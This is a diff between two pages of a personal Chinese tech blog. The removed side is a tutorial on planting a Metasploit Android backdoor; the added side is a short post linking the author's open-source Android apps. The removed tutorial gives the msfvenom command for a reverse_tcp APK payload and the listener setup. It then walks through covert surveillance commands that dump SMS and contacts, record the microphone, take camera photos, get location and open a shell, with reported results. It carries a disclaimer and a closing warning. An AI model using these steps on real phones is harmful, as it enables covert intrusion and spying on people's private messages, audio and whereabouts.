@@ -6,57 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://y00z.github.io">
-  <title>msf渗透android并植入后门 | Yooz的博客</title>
+  <title>安卓源码三连发 | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.当时正好移动设备特别火,所以决定入坑安卓开发了.当时给自己定下的目标是先学习java，javaweb，然后是android.
+学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.
 
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动">
+手机安全卫士">
 <meta property="og:type" content="article">
-<meta property="og:title" content="msf渗透android并植入后门">
-<meta property="og:url" content="http://y00z.github.io/2016/12/19/msf渗透android并植入后门/index.html">
+<meta property="og:title" content="安卓源码三连发">
+<meta property="og:url" content="http://y00z.github.io/2017/01/06/安卓源码三连发/index.html">
 <meta property="og:site_name" content="Yooz的博客">
 <meta property="og:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.当时正好移动设备特别火,所以决定入坑安卓开发了.当时给自己定下的目标是先学习java，javaweb，然后是android.
+学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.
 
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-10.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-11.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-12.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-13.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-14.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-15.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-16.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-17.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-18.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-19.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-20.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-21.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-22.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-23.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-24.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-25.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-26.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-27.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-28.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-29.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-30.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-31.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-32.png">
-<meta property="og:updated_time" content="2016-12-20T08:50:50.111Z">
+手机安全卫士">
+<meta property="og:updated_time" content="2017-01-06T07:50:16.260Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="msf渗透android并植入后门">
+<meta name="twitter:title" content="安卓源码三连发">
 <meta name="twitter:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.当时正好移动设备特别火,所以决定入坑安卓开发了.当时给自己定下的目标是先学习java，javaweb，然后是android.
+学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.
 
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动">
-<meta name="twitter:image" content="http://y00z.github.io/images/pasted-10.png">
+手机安全卫士">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
@@ -178,124 +151,35 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-msf渗透android并植入后门" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-安卓源码三连发" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      msf渗透android并植入后门
+      安卓源码三连发
     </h1>
   
 
-        <a href="/2016/12/19/msf渗透android并植入后门/" class="archive-article-date">
-  	<time datetime="2016-12-19T07:32:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-19</time>
+        <a href="/2017/01/06/安卓源码三连发/" class="archive-article-date">
+  	<time datetime="2017-01-06T06:11:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-06</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
-
-</blockquote>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 <a id="more"></a>。团队合作，在Metasploit和综合报告提出了他们的发现。</p>
-</blockquote>
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
+<p>早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.<br>当时正好移动设备特别火,所以决定入坑安卓开发了.<br>当时给自己定下的目标是先学习java，javaweb，然后是android.</p>
+<p>学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.</p>
 <ul>
-<li>BackBox、kali linux、或者BackTrack(kali linux的前身)</li>
-<li>一台安卓设备</li>
-</ul>
-<p>环境不说太多介绍了，直接来实战。</p>
-<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>装好环境后查看自己的ip<br><img src="images/pasted-10.png" alt=""></p>
-<p>生成一个payload</p>
-<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk
-</code></pre><ul>
-<li>p 设置要使用的payload</li>
-<li>LHOST 设置用来接收反弹连接的主机</li>
-<li>LPORT 设置用来接收反弹连接的端口</li>
+<li>手机安全卫士<a id="more"></a><br>   <a href="https://github.com/Y00z/android_security" target="_blank" rel="external">https://github.com/Y00z/android_security</a></li>
+<li>新闻客户端<br>   <a href="https://github.com/Y00z/android_news" target="_blank" rel="external">https://github.com/Y00z/android_news</a></li>
+<li>应用市场<br>   <a href="https://github.com/Y00z/android_googlePlay" target="_blank" rel="external">https://github.com/Y00z/android_googlePlay</a></li>
 </ul>
 </blockquote>
-<p><img src="/images/pasted-11.png" alt=""></p>
-<blockquote>
-<p>很小，才8kb<br>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。<br>生成的apk放到手机上安装，安装完成后是这样的。<br><img src="/images/pasted-12.png" alt=""></p>
-</blockquote>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
-<p>启动msf<br><img src="/images/pasted-13.png" alt=""><br>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)</p>
-<pre><code>* use exploit/multi/handler
-* set payload android/meterpreter/reverse_tcp
-* set LHOST 192.168.0.18 
-* set LPORT 2333
-</code></pre><p><img src="/images/pasted-14.png" alt=""><br>设置完毕后就可以输入 <code>exploit</code> 来执行攻击了<br><img src="/images/pasted-15.png" alt=""></p>
-<p>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线<br>然后我打开我们刚刚安装的<br>打开后会连接到msf<br><img src="/images/pasted-16.png" alt=""><br><img src="/images/pasted-17.png" alt=""><br>这样我们就拿到了手机的shell</p>
-</blockquote>
-<h3 id="控制指令"><a href="#控制指令" class="headerlink" title="控制指令"></a>控制指令</h3><blockquote>
-<p>我来介绍几个有意思的指令。</p>
-<pre><code>* check_root    #查看是否root
-* dump_calllog    #下载通讯记录
-* dump_contacts    #下载联系人
-* dump_sms        #下载短信
-* send_sms        #发送短信
-* record_mic    #录音
-* webcam_list    #查看手机摄像头
-* webcam_snap    #拍照
-* webcam_stream    #连续拍照
-* geolocate        #获取目标地理位置
-* upload        #上传文件到手机
-* download        #下载手机上的文件
-* shell            #进入手机的bash shell
-</code></pre></blockquote>
-<h5 id="check-root-检测root"><a href="#check-root-检测root" class="headerlink" title="check_root(检测root)"></a>check_root(检测root)</h5><blockquote>
-<p><img src="/images/pasted-18.png" alt=""><br>是root的设备</p>
-</blockquote>
-<h5 id="dump-contacts-下载联系人"><a href="#dump-contacts-下载联系人" class="headerlink" title="dump_contacts(下载联系人)"></a>dump_contacts(下载联系人)</h5><blockquote>
-<p><img src="/images/pasted-19.png" alt=""><br>57个联系人<br><img src="/images/pasted-20.png" alt=""></p>
-</blockquote>
-<h5 id="dump-sms-下载短信"><a href="#dump-sms-下载短信" class="headerlink" title="dump_sms(下载短信)"></a>dump_sms(下载短信)</h5><blockquote>
-<p><img src="/images/pasted-21.png" alt=""><br>1271条短信<br><img src="/images/pasted-22.png" alt=""></p>
-</blockquote>
-<h5 id="send-sms-发送短信"><a href="#send-sms-发送短信" class="headerlink" title="send_sms(发送短信)"></a>send_sms(发送短信)</h5><blockquote>
-<ul>
-<li>-d目标电话号码</li>
-<li>-t 短信内容<br><img src="/images/pasted-23.png" alt=""><br><img src="/images/pasted-24.png" alt=""></li>
-</ul>
-</blockquote>
-<h5 id="record-mic-录音"><a href="#record-mic-录音" class="headerlink" title="record_mic(录音)"></a>record_mic(录音)</h5><blockquote>
-<ul>
-<li>-d 录音的秒数<br>音频文件会自动保存在/var/www/html/目录下<br><img src="/images/pasted-25.png" alt=""></li>
-</ul>
-</blockquote>
-<h5 id="webcam-list-检测摄像头"><a href="#webcam-list-检测摄像头" class="headerlink" title="webcam_list(检测摄像头)"></a>webcam_list(检测摄像头)</h5><blockquote>
-<p><img src="/images/pasted-26.png" alt=""><br>2:前置摄像头<br>1:后置摄像头</p>
-</blockquote>
-<h5 id="webcam-snap-拍照"><a href="#webcam-snap-拍照" class="headerlink" title="webcam_snap(拍照)"></a>webcam_snap(拍照)</h5><blockquote>
-<ul>
-<li>-i 选择使用哪个摄像头拍照<br>手机息屏的时候也可以拍照<br><img src="/images/pasted-27.png" alt=""></li>
-</ul>
-</blockquote>
-<h5 id="webcam-stream-连续拍照"><a href="#webcam-stream-连续拍照" class="headerlink" title="webcam_stream(连续拍照)"></a>webcam_stream(连续拍照)</h5><blockquote>
-<ul>
-<li>-i 指定摄像头</li>
-<li>-d 拍照间隔(默认1800毫秒)<br>使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片<br><img src="/images/pasted-28.png" alt=""></li>
-</ul>
-</blockquote>
-<h5 id="geolocate-获取地理位置"><a href="#geolocate-获取地理位置" class="headerlink" title="geolocate(获取地理位置)"></a>geolocate(获取地理位置)</h5><blockquote>
-<p><img src="/images/pasted-29.png" alt=""></p>
-</blockquote>
-<h5 id="upload-上传文件到手机"><a href="#upload-上传文件到手机" class="headerlink" title="upload(上传文件到手机)"></a>upload(上传文件到手机)</h5><blockquote>
-<p><img src="/images/pasted-30.png" alt=""></p>
-</blockquote>
-<h5 id="download-下载文件到手机"><a href="#download-下载文件到手机" class="headerlink" title="download(下载文件到手机)"></a>download(下载文件到手机)</h5><blockquote>
-<p><img src="/images/pasted-31.png" alt=""></p>
-</blockquote>
-<h5 id="shell-进入手机bash-shell"><a href="#shell-进入手机bash-shell" class="headerlink" title="shell(进入手机bash shell)"></a>shell(进入手机bash shell)</h5><blockquote>
-<p><img src="/images/pasted-32.png" alt=""></p>
-</blockquote>
-<p>###最后</p>
-<blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。</p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><blockquote>
+<p>移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.<br>门槛不高，第三方框架和解决方案太多太多了.<br>个人目前正在学习研究nodejs，react-native，python.<br>欢迎志向相同的朋友交流一起学习</p>
 </blockquote>
 
       
@@ -345,7 +229,7 @@
         </li>
        
         <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color5">安全攻防</a>
+        	<a href="javascript:void(0)" class="article-tag-list-link color3">开源</a>
         </li>
       
 		</ul>
@@ -401,7 +285,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/2016/12/19/msf渗透android并植入后门/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/2017/01/06/安卓源码三连发/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -415,18 +299,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/12/20/node开发电影站项目/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/01/08/对安卓锁机恶意程序反编译分析/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          node开发电影站项目
+          对安卓锁机恶意程序反编译分析
         
       </div>
     </a>
   
   
-    <a href="/2016/12/15/hexo-github搭建免费个人博客/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">hexo+github搭建免费个人博客</div>
+    <a href="/2016/12/20/node开发电影站项目/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">node开发电影站项目</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -439,7 +323,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="msf渗透android并植入后门" data-title="msf渗透android并植入后门" data-url="http://y00z.github.io/2016/12/19/msf渗透android并植入后门/"></div>
+	<div class="ds-thread" data-thread-key="安卓源码三连发" data-title="安卓源码三连发" data-url="http://y00z.github.io/2017/01/06/安卓源码三连发/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
